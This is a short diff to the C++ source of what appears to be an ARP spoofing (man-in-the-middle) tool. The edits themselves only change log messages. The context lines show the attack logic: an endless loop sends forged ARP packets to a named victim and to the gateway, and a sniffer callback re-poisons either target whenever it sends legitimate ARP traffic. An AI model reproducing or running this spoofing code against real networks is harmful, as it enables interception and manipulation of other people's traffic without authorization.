@@ -49,12 +49,11 @@ void* Spoofer::spoof(void* args){
 	char filter[] = "arp";
 	Sniffer sniffer(filter);
 
-	printf("Spoofing victims\n");
+	printf("Spoofing is settled\n");
 	do{
 		// Spoofando de novo
 		toVictim.send();
 		toGateway.send();
-		printf("ENVIANDO SPOOFS!\n");
 
 		sniffer.listen(spoofBack);
 	} while(true);
@@ -79,7 +78,7 @@ void Spoofer::spoofBack(u_char* args, const struct pcap_pkthdr* header, const un
 		if(htons(arp.arpOp) == ARPOP_REPLY){
 			if((arp.spaddr == Globals::victim.ip || arp.spaddr == Globals::gateway.ip)
 			   && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet,6)){
-				// printf ("Target: %s sent legitimate ARP packet. Spoof back...\n", Host::ipToString(arp.spaddr).c_str());
+				printf ("Target: %s sent legitimate ARP packet. Spoof back...\n", Host::ipToString(arp.spaddr).c_str());
 				pcap_breakloop(pcapContext);
 			}
 
@@ -87,7 +86,7 @@ void Spoofer::spoofBack(u_char* args, const struct pcap_pkthdr* header, const un
 		} else if (htons(arp.arpOp) == ARPOP_REQUEST){
 			if((arp.tpaddr == Globals::victim.ip || arp.tpaddr == Globals::gateway.ip)
 			  && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet, 6)){
-				// printf ("Someone is asking for the MAC of one of the targets... Spoof back!\n");
+				printf ("Someone is asking for the MAC of one of the targets... Spoof back!\n");
 				pcap_breakloop(pcapContext);
 			}
 		}
